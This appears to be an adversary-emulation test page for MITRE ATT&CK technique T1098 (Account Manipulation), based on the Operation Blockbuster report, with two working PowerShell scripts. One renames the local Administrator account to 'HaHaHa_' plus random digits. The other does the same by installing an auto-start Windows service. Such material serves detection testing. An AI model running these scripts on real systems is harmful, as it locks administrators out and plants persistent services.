# Account Manipulation

MITRE ATT&CK Technique: [T1098](https://attack.mitre.org/wiki/Technique/T1098)

Adapted from [Operation Blockbuster](https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)

## Example 1

If successful, the Administrator account will be renamed with `HaHaHa_` followed by 4 to 16 digits.

    $x = Get-Random -Minimum 2 -Maximum 9999
    $y = Get-Random -Minimum 2 -Maximum 9999
    $z = Get-Random -Minimum 2 -Maximum 9999
    $w = Get-Random -Minimum 2 -Maximum 9999
    Write-Host HaHaHa_$x$y$z$w

    $hostname = (Get-CIMInstance CIM_ComputerSystem).Name

    $fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

    foreach($member in $fmm) {
        if($member -like "*Administrator*") {
            Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
            Write-Host "Successfully Renamed Administrator Account on" $hostname
            }
        }

## Example 2

If successful, the Administrator account will be renamed with `HaHaHa_` followed by 4 to 8 digits.

    $x = Get-Random -Minimum 2 -Maximum 99
    $y = Get-Random -Minimum 2 -Maximum 99
    $z = Get-Random -Minimum 2 -Maximum 99
    $w = Get-Random -Minimum 2 -Maximum 99
    $newadmin = "HaHaHa_$x$y$z$w".ToString()

    $serviceName = "Rename Account Service"
    $serviceDisplayName = "Rename Account Service"
    $serviceDescription = "Rename Account Service"
    $serviceExecutable = "wmic useraccount where name='Administrator' rename '$newadmin'"

    if (Get-Service $serviceName -ErrorAction SilentlyContinue)
    {
        $serviceToRemove = Get-WmiObject -Class Win32_Service -Filter "name='$serviceName'"
        $serviceToRemove | Stop-Service
        $serviceToRemove.delete()
    }
    else
    {
        "service does not exists"
    }

    Write-Host "Installing service: $serviceName"
    New-Service -name $serviceName -displayName $serviceDisplayName -binaryPathName $serviceExecutable -startupType Automatic -Description $serviceDescription
    Write-Host "Installation completed: $serviceName"

    Write-Host "Trying to start new service: $serviceName"

    $serviceToStart = Get-WmiObject -Class Win32_Service -Filter "name='$serviceName'"
    $serviceToStart.startservice()
    Write-Host "Service started: $serviceName"
